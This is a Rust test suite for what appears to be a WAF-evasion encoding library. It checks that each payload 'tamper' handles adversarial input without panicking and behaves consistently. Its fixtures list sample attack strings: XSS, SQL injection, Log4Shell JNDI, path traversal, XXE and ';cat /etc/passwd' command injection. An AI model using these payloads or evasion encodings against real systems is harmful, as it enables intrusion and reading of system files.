//! Universal invariants applied to EVERY default tamper.
//!
//! These are the contracts that any tamper added to the default
//! registry must uphold, regardless of its specific semantics:
//!
//!  - never panics on any input (empty, 100KB, NUL, full Unicode plane)
//!  - returns valid UTF-8
//!  - second pass stays within the 4x+64 cap documented in
//!    `mutator_idempotence` proptest
//!  - name follows snake_case + lowercase-ASCII convention
//!  - description is non-empty
//!  - aggressiveness is finite and in [0, 1]
//!  - registry registration matches DEFAULT_NAMES
//!  - dispatch through `tamper(name, ...)` works
//!  - concurrent calls from many threads produce consistent output
//!
//! A failure here is a strong signal that a new tamper has shipped
//! without honoring the framework contract.

use std::sync::Arc;
use std::thread;
use wafrift_encoding::tamper::TamperRegistry;
use wafrift_encoding::{all_tamper_names, tamper};

fn all_default_names() -> Vec<&'static str> {
    all_tamper_names().to_vec()
}

// ────────────────────────────────────────────────────────────────
// Registry shape
// ────────────────────────────────────────────────────────────────

#[test]
fn default_registry_has_at_least_28_tampers() {
    assert!(all_tamper_names().len() >= 28);
}

#[test]
fn every_default_name_resolves_in_registry() {
    let reg = TamperRegistry::with_defaults();
    for name in all_default_names() {
        assert!(reg.get(name).is_some(), "missing registration for `{name}`");
    }
}

#[test]
fn registry_name_count_matches_static_list_count() {
    let reg = TamperRegistry::with_defaults();
    let reg_names: std::collections::HashSet<&str> = reg.names().into_iter().collect();
    let static_names: std::collections::HashSet<&str> = all_default_names().into_iter().collect();
    assert_eq!(
        reg_names, static_names,
        "DEFAULT_NAMES list and actual registry contents drifted"
    );
}

#[test]
fn no_duplicate_names_in_default_list() {
    let names = all_default_names();
    let set: std::collections::HashSet<&str> = names.iter().copied().collect();
    assert_eq!(set.len(), names.len(), "duplicate name in DEFAULT_NAMES");
}

// ────────────────────────────────────────────────────────────────
// Name / metadata convention
// ────────────────────────────────────────────────────────────────

#[test]
fn every_name_is_lowercase_ascii_snake_case() {
    for name in all_default_names() {
        assert!(
            name.chars()
                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '_'),
            "tamper `{name}` not snake_case"
        );
        assert!(
            !name.starts_with('_'),
            "tamper `{name}` starts with underscore"
        );
        assert!(!name.ends_with('_'), "tamper `{name}` ends with underscore");
        assert!(
            !name.contains("__"),
            "tamper `{name}` has double underscore"
        );
    }
}

#[test]
fn every_description_is_non_empty_ascii_text() {
    let reg = TamperRegistry::with_defaults();
    for name in all_default_names() {
        let s = reg.get(name).unwrap();
        assert!(!s.description().is_empty(), "{name} has empty description");
        assert!(
            s.description().len() >= 10,
            "{name} description too short to be useful: {:?}",
            s.description()
        );
    }
}

#[test]
fn every_description_is_valid_utf8() {
    let reg = TamperRegistry::with_defaults();
    for name in all_default_names() {
        let s = reg.get(name).unwrap();
        let _ = std::str::from_utf8(s.description().as_bytes()).unwrap();
    }
}

#[test]
fn every_aggressiveness_finite_in_range() {
    let reg = TamperRegistry::with_defaults();
    for name in all_default_names() {
        let s = reg.get(name).unwrap();
        let a = s.aggressiveness();
        assert!(!a.is_nan(), "{name} aggressiveness is NaN");
        assert!(a.is_finite(), "{name} aggressiveness is not finite");
        assert!(
            (0.0..=1.0).contains(&a),
            "{name} aggressiveness {a} out of [0,1]"
        );
    }
}

#[test]
fn name_returned_by_strategy_matches_registry_key() {
    let reg = TamperRegistry::with_defaults();
    for name in all_default_names() {
        let s = reg.get(name).unwrap();
        assert_eq!(s.name(), name, "name mismatch for `{name}`");
    }
}

// ────────────────────────────────────────────────────────────────
// Safety on adversarial inputs
// ────────────────────────────────────────────────────────────────

#[test]
fn no_panic_on_empty_input() {
    for name in all_default_names() {
        let _ = tamper(name, "", None).expect(name);
    }
}

#[test]
fn no_panic_on_single_ascii_char() {
    for c in b'!'..=b'~' {
        let s = (c as char).to_string();
        for name in all_default_names() {
            let _ = tamper(name, &s, None).expect(name);
        }
    }
}

#[test]
fn no_panic_on_null_byte() {
    for name in all_default_names() {
        let _ = tamper(name, "\0", None).expect(name);
    }
}

#[test]
fn no_panic_on_control_chars() {
    let payload: String = (0u8..=0x1F).map(|b| b as char).collect();
    for name in all_default_names() {
        let _ = tamper(name, &payload, None).expect(name);
    }
}

#[test]
fn no_panic_on_high_unicode() {
    let payload = "日本語🔥💀👻 ñ é ü ÿ";
    for name in all_default_names() {
        let _ = tamper(name, payload, None).expect(name);
    }
}

#[test]
fn no_panic_on_only_whitespace() {
    for name in all_default_names() {
        let _ = tamper(name, "   \t\n\r ", None).expect(name);
    }
}

#[test]
fn no_panic_on_only_quotes() {
    for name in all_default_names() {
        let _ = tamper(name, "''''", None).expect(name);
        let _ = tamper(name, "\"\"\"\"", None).expect(name);
    }
}

#[test]
fn no_panic_on_only_backslashes() {
    for name in all_default_names() {
        let _ = tamper(name, "\\\\\\\\", None).expect(name);
    }
}

#[test]
fn no_panic_on_huge_alphanumeric_input() {
    let p: String = "A".repeat(50_000);
    for name in all_default_names() {
        let _ = tamper(name, &p, None).expect(name);
    }
}

#[test]
fn no_panic_on_huge_unicode_input() {
    let p: String = "日".repeat(10_000);
    for name in all_default_names() {
        let _ = tamper(name, &p, None).expect(name);
    }
}

#[test]
fn no_panic_on_huge_punctuation() {
    let p: String = "()[]{}<>!@#$%^&*-+=/\\|".repeat(2_500);
    for name in all_default_names() {
        let _ = tamper(name, &p, None).expect(name);
    }
}

#[test]
fn no_panic_on_repeated_quote_alternation() {
    let p: String = "'a'b'c'd'e'f'g'h'i'j'k'l'm'n'o'p'q'r'".repeat(50);
    for name in all_default_names() {
        let _ = tamper(name, &p, None).expect(name);
    }
}

#[test]
fn no_panic_on_only_format_chars() {
    // ZWSP, ZWNJ, ZWJ, BOM, U+200D, etc.
    let p = "\u{200B}\u{200C}\u{200D}\u{FEFF}";
    for name in all_default_names() {
        let _ = tamper(name, p, None).expect(name);
    }
}

#[test]
fn no_panic_on_combined_attack_payloads() {
    let payloads = [
        "<script>alert(1)</script>",
        "' UNION SELECT NULL--",
        "${jndi:ldap://x.y/z}",
        "../../etc/passwd",
        "{{7*7}}",
        "<!DOCTYPE x [<!ENTITY a SYSTEM \"file:///etc/passwd\">]>",
        ";cat /etc/passwd",
        "'; DROP TABLE users--",
        "(){:;};",
        "%2e%2e%2f",
        "\\u003cscript\\u003e",
        "&#x3c;script&#x3e;",
    ];
    for p in &payloads {
        for name in all_default_names() {
            let _ = tamper(name, p, None).expect(name);
        }
    }
}

// ────────────────────────────────────────────────────────────────
// UTF-8 validity of every output
// ────────────────────────────────────────────────────────────────

#[test]
fn every_tamper_returns_valid_utf8_for_keyword_payload() {
    let p = "UNION SELECT * FROM users WHERE id=1";
    for name in all_default_names() {
        let out = tamper(name, p, None).unwrap();
        std::str::from_utf8(out.as_bytes())
            .unwrap_or_else(|_| panic!("{name} produced invalid UTF-8 on `{p}`"));
    }
}

#[test]
fn every_tamper_returns_valid_utf8_for_unicode_payload() {
    let p = "café 日本語 🔥";
    for name in all_default_names() {
        let out = tamper(name, p, None).unwrap();
        std::str::from_utf8(out.as_bytes())
            .unwrap_or_else(|_| panic!("{name} produced invalid UTF-8 on unicode payload"));
    }
}

#[test]
fn every_tamper_returns_valid_utf8_for_xss() {
    let p = "<script>alert('XSS')</script>";
    for name in all_default_names() {
        let out = tamper(name, p, None).unwrap();
        std::str::from_utf8(out.as_bytes())
            .unwrap_or_else(|_| panic!("{name} produced invalid UTF-8 on XSS payload"));
    }
}

// ────────────────────────────────────────────────────────────────
// Second-pass cap (independent of mutator_idempotence proptest —
// this is a deterministic check on a fixed set of seed payloads)
// ────────────────────────────────────────────────────────────────

const SECOND_PASS_FUDGE: usize = 64;

/// Per-strategy second-pass expansion multiplier, mirroring the
/// authoritative caps documented in
/// `crates/encoding/tests/mutator_idempotence.rs`. Tampers that expand
/// every byte (unicode_escape: 6×, html_entity_variants: 10×, etc.)
/// need explicit per-strategy caps; the default 4× applies to the rest.
fn second_pass_cap(name: &str, once_len: usize) -> usize {
    let mult = match name {
        "unicode_escape" => 36,        // 6× per pass × 6× → 36
        "html_entity_variants" => 100, // documented 10× per pass
        "html_entity" => 36,           // 6× → 36
        "url_encode" => 9,
        "double_url_encode" => 81,
        "base64" => 16,
        "hex_encode" => 16,
        "overlong_utf8" => 16,
        _ => 4,
    };
    once_len
        .saturating_mul(mult)
        .saturating_add(SECOND_PASS_FUDGE)
}

#[test]
fn second_pass_bound_on_empty() {
    for name in all_default_names() {
        let once = tamper(name, "", None).unwrap();
        let twice = tamper(name, &once, None).unwrap();
        let cap = second_pass_cap(name, once.len());
        assert!(
            twice.len() <= cap,
            "{name} exceeded second-pass cap: once={} twice={} cap={cap}",
            once.len(),
            twice.len()
        );
    }
}

#[test]
fn second_pass_bound_on_keyword() {
    let p = "UNION SELECT";
    for name in all_default_names() {
        let once = tamper(name, p, None).unwrap();
        let twice = tamper(name, &once, None).unwrap();
        let cap = second_pass_cap(name, once.len());
        assert!(
            twice.len() <= cap,
            "{name} exceeded cap on keyword: once={} twice={} cap={cap}",
            once.len(),
            twice.len()
        );
    }
}

#[test]
fn second_pass_bound_on_long_repetitive() {
    let p: String = "A".repeat(200);
    for name in all_default_names() {
        if matches!(name, "random_case") {
            continue;
        }
        let once = tamper(name, &p, None).unwrap();
        let twice = tamper(name, &once, None).unwrap();
        let cap = second_pass_cap(name, once.len());
        assert!(
            twice.len() <= cap,
            "{name} exceeded second-pass cap on long input: once={} twice={} cap={cap}",
            once.len(),
            twice.len()
        );
    }
}

// ────────────────────────────────────────────────────────────────
// Determinism (excludes RandomCase-class tampers)
// ────────────────────────────────────────────────────────────────

const NON_DETERMINISTIC: &[&str] = &["random_case", "whitespace_insertion"];

#[test]
fn deterministic_tampers_produce_same_output_twice() {
    let p = "UNION SELECT * FROM users";
    for name in all_default_names() {
        if NON_DETERMINISTIC.contains(&name) {
            continue;
        }
        let a = tamper(name, p, None).unwrap();
        let b = tamper(name, p, None).unwrap();
        assert_eq!(a, b, "{name} non-deterministic");
    }
}

#[test]
fn deterministic_tampers_consistent_across_threads() {
    let p = "UNION SELECT * FROM users";
    for name in all_default_names() {
        if NON_DETERMINISTIC.contains(&name) {
            continue;
        }
        let expected = tamper(name, p, None).unwrap();
        let reg = Arc::new(TamperRegistry::with_defaults());
        let mut handles = vec![];
        for _ in 0..8 {
            let r = Arc::clone(&reg);
            let p = p.to_string();
            let e = expected.clone();
            handles.push(thread::spawn(move || {
                let out = r.tamper_with(name, &p, None).unwrap();
                assert_eq!(out, e, "{name} differs across threads");
            }));
        }
        for h in handles {
            h.join().unwrap();
        }
    }
}

// ────────────────────────────────────────────────────────────────
// Dispatch surface
// ────────────────────────────────────────────────────────────────

#[test]
fn dispatch_via_tamper_fn_matches_registry_get() {
    let reg = TamperRegistry::with_defaults();
    let p = "UNION SELECT";
    for name in all_default_names() {
        if NON_DETERMINISTIC.contains(&name) {
            continue;
        }
        let via_fn = tamper(name, p, None).unwrap();
        let via_reg = reg.tamper_with(name, p, None).unwrap();
        assert_eq!(via_fn, via_reg, "{name} dispatch divergence");
    }
}

#[test]
fn unknown_tamper_returns_error() {
    assert!(tamper("definitely_not_a_real_tamper_xyz", "x", None).is_err());
    assert!(tamper("", "x", None).is_err());
    assert!(tamper(" ", "x", None).is_err());
}

#[test]
fn registry_get_returns_none_for_unknown() {
    let reg = TamperRegistry::with_defaults();
    assert!(reg.get("not_a_real_tamper").is_none());
    assert!(reg.get("").is_none());
}

// ────────────────────────────────────────────────────────────────
// Reasonable output magnitude (no silent empty outputs)
// ────────────────────────────────────────────────────────────────

#[test]
fn no_default_tamper_produces_empty_output_on_keyword() {
    let p = "UNION SELECT";
    for name in all_default_names() {
        let out = tamper(name, p, None).unwrap();
        assert!(!out.is_empty(), "{name} produced empty output on `{p}`");
    }
}

#[test]
fn no_default_tamper_produces_empty_output_on_xss() {
    let p = "<script>alert(1)</script>";
    for name in all_default_names() {
        let out = tamper(name, p, None).unwrap();
        assert!(!out.is_empty(), "{name} produced empty output on `{p}`");
    }
}

// ────────────────────────────────────────────────────────────────
// `by_aggressiveness` sort stability
// ────────────────────────────────────────────────────────────────

#[test]
fn by_aggressiveness_returns_all_strategies() {
    let reg = TamperRegistry::with_defaults();
    let by = reg.by_aggressiveness();
    assert_eq!(by.len(), all_default_names().len());
}

#[test]
fn by_aggressiveness_is_monotonic_non_decreasing() {
    let reg = TamperRegistry::with_defaults();
    let by = reg.by_aggressiveness();
    for w in by.windows(2) {
        let (a, b) = (w[0], w[1]);
        assert!(
            a.aggressiveness() <= b.aggressiveness(),
            "by_aggressiveness not sorted: {} ({}) vs {} ({})",
            a.name(),
            a.aggressiveness(),
            b.name(),
            b.aggressiveness()
        );
    }
}

// ────────────────────────────────────────────────────────────────
// Registry build is hermetic (independent calls don't share state)
// ────────────────────────────────────────────────────────────────

#[test]
fn independent_registries_have_identical_tampers() {
    let r1 = TamperRegistry::with_defaults();
    let r2 = TamperRegistry::with_defaults();
    let n1: std::collections::HashSet<&str> = r1.names().into_iter().collect();
    let n2: std::collections::HashSet<&str> = r2.names().into_iter().collect();
    assert_eq!(n1, n2);
}

#[test]
fn empty_registry_then_register_works() {
    let mut reg = TamperRegistry::new();
    assert!(reg.get("json_unicode_alnum").is_none());
    // Register one of the default tampers manually.
    // (We can't easily instantiate the struct here without importing
    // it, so just register every default.)
    reg = TamperRegistry::with_defaults();
    assert!(reg.get("json_unicode_alnum").is_some());
}

// ────────────────────────────────────────────────────────────────
// Stress: every tamper × every payload, no panic
// ────────────────────────────────────────────────────────────────

#[test]
fn cross_product_every_tamper_every_payload() {
    let long_a = "A".repeat(1000);
    let long_space = " ".repeat(1000);
    let long_quote = "'".repeat(100);
    let payloads: &[&str] = &[
        "",
        "a",
        "A",
        "1",
        " ",
        "'",
        "\"",
        "\\",
        "<",
        ">",
        "(",
        ")",
        "=",
        "; DROP TABLE users",
        "' OR 1=1--",
        "<script>alert(1)</script>",
        "${jndi:ldap://x/y}",
        "../../../etc/passwd",
        "{{7*7}}",
        "café",
        "日本語",
        "🔥💀",
        long_a.as_str(),
        long_space.as_str(),
        long_quote.as_str(),
    ];
    for p in payloads {
        for name in all_default_names() {
            let _ = tamper(name, p, None).unwrap_or_else(|e| panic!("{name} on `{p}` failed: {e}"));
        }
    }
}
